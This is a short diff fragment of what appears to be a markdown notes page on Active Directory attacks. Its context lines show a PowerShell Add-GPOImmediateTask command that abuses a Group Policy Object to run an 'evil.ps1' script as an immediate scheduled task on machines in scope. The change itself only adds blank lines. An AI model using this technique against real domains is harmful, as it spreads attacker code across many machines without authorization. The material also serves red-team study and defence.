@@ -16,3 +16,5 @@ updated_at: '2023-04-10T20:26:15.994624+00:00'
 ```bash
 Add-GPOImmediateTask -TaskName 'eviltask' -Command 'powershell.exe /c' -CommandArguments "'$(Get-Content evil.ps1)'" -Author Administrator -Scope Computer/User -GPOIdentity 'SuperSecureGPO'
 ```
+
+
